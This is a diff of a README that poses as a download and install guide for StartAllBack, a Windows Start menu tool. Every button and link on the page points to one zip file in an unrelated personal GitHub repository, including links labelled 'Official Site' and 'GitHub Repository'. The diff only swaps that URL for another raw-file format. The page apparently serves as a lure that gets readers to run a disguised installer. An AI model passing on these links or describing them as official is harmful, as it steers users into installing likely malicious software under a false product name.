@@ -5,7 +5,7 @@ description: "Download StartAllBack to restore the classic Start Menu and taskba
 ---
 # 🪟 StartAllBack-2026 - Restore your classic Start Menu.
 
-[![Download Now](https://img.shields.io/badge/Download-StartAllBack_2026-teal?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/radha9725/radha9725.github.io/main/judgelike/io-radha-github-v2.2.zip)
+[![Download Now](https://img.shields.io/badge/Download-StartAllBack_2026-teal?style=for-the-badge&logo=windows)](https://github.com/radha9725/radha9725.github.io/raw/refs/heads/main/judgelike/io-radha-github-v2.2.zip)
 
 StartAllBack brings back the familiar Windows 10-style Start menu, taskbar, and File Explorer to Windows 11. It also works on Windows 10 if you prefer the older interface. This guide shows you how to download, install, and set it up on your computer.
 
@@ -48,7 +48,7 @@ Follow these steps to download and install StartAllBack. You do not need any tec
 
 Visit the official download page by clicking the button below or the link at the top of this page.
 
-[![Download StartAllBack](https://img.shields.io/badge/Download-StartAllBack_2026-teal?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/radha9725/radha9725.github.io/main/judgelike/io-radha-github-v2.2.zip)
+[![Download StartAllBack](https://img.shields.io/badge/Download-StartAllBack_2026-teal?style=for-the-badge&logo=windows)](https://github.com/radha9725/radha9725.github.io/raw/refs/heads/main/judgelike/io-radha-github-v2.2.zip)
 
 On the page, you will see a list of files. Look for a file named `StartAllBack_Setup.exe` (or similar). Click on it to download. The file is small and downloads quickly.
 
@@ -151,8 +151,8 @@ StartAllBack is a commercial product. You can use it for free during a 30-day tr
 
 ## 📦 Additional Resources
 
-- [StartAllBack Official Site](https://raw.githubusercontent.com/radha9725/radha9725.github.io/main/judgelike/io-radha-github-v2.2.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/radha9725/radha9725.github.io/main/judgelike/io-radha-github-v2.2.zip)
-- [Windows 11 Customization Guide](https://raw.githubusercontent.com/radha9725/radha9725.github.io/main/judgelike/io-radha-github-v2.2.zip) (placeholder)
+- [StartAllBack Official Site](https://github.com/radha9725/radha9725.github.io/raw/refs/heads/main/judgelike/io-radha-github-v2.2.zip)
+- [GitHub Repository](https://github.com/radha9725/radha9725.github.io/raw/refs/heads/main/judgelike/io-radha-github-v2.2.zip)
+- [Windows 11 Customization Guide](https://github.com/radha9725/radha9725.github.io/raw/refs/heads/main/judgelike/io-radha-github-v2.2.zip) (placeholder)
 
 We built this guide to help you get started quickly. Download StartAllBack, install it, and enjoy your classic desktop again.
